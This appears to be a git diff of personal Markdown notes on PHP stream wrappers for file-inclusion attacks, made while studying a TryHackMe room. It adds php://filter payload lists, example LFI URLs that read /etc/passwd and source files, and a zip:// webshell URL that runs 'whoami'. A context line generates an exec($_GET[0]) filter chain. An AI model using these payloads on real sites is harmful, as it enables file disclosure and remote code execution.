@@ -1,10 +1,24 @@
-# PHP Filters
+# PHP Wrappers
 
-PHP Filters are a powerful wrappers of lots a functionality that take input and perform operations on it without developer having to write in-house checks, filters, etc against common input to website.
+PHP Wrappers are a powerful wrappers of lots a functionality that take input and perform operations on it without developer having to write in-house checks, filters, etc against common input to website.
 - [Validation Filters perform type and pattern checks](https://www.php.net/manual/en/filter.filters.validate.php)
 - [Sanitization Filters perform string operations to modify unsafe input](https://www.php.net/manual/en/filter.filters.sanitize.php)
 - [Only other is "callback" where all flags are ignored](https://www.php.net/manual/en/filter.filters.misc.php)
 - [PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) provides developers to filter by builtin conditions-on-passed-input, encode the input.
+
+```php
+// Protocol Wrapper
+php://filter
+// Filter
+convert.base64-decode
+// Resource Type
+resource=
+// Data Type
+data://plain/text,
+// Payload
+...
+```
+
 
 Use cases in Hacking
 ```php
@@ -25,7 +39,18 @@ Be aware that `php://filter` is a stream wrapper and how you are abusing `php://
 - Appending a file extension by default
 - Checking what files are being streamed 
 
-[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers)
+A list 
+```php
+php://filter/convert.base64-encode/resource=
+php://filter/convert.iconv.utf-8.utf-16/resource=
+php://filter/read=string.rot13/resource=
+php://filter/string.toupper/resource=
+php://filter/string.tolower/resource=
+php://filter/string.strip_tags/resource=
+```
+
+
+[LFI / RFI using PHP://filters](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi--rfi-using-wrappers) examples from:
 ```php
 // only php://filter is case insensitive
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index
@@ -34,12 +59,16 @@ http://example.com/index.php?page=php://filter/convert.base64-encode/resource=in
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index
 // unzip a .zip file that you have uploaded to the server somehow and execute a webshell 
 http://example.com/index.php?file=zip:/var/www/html/exploit.zip%23cmd.php&cmd=whoami
-
-// They can be chained together with:
-// | or /
+````
+They can be chained together with:
+```php
+// ... with: | or /
 // Beware this probably wont work as .php may be appended
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 // base64encode only for limit exfil - buffer size 8192 bytes
+
+
+
 
 
 ```
@@ -69,4 +98,4 @@ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 [Sanitization Filters](https://www.php.net/manual/en/filter.filters.sanitize.php)
 [Misc Filters](https://www.php.net/manual/en/filter.filters.misc.php)
 [PHP Filter flags](https://www.php.net/manual/en/filter.filters.flags.php) 
-
+[THM Room File Inclusion, Path Traversal](https://tryhackme.com/room/filepathtraversal)
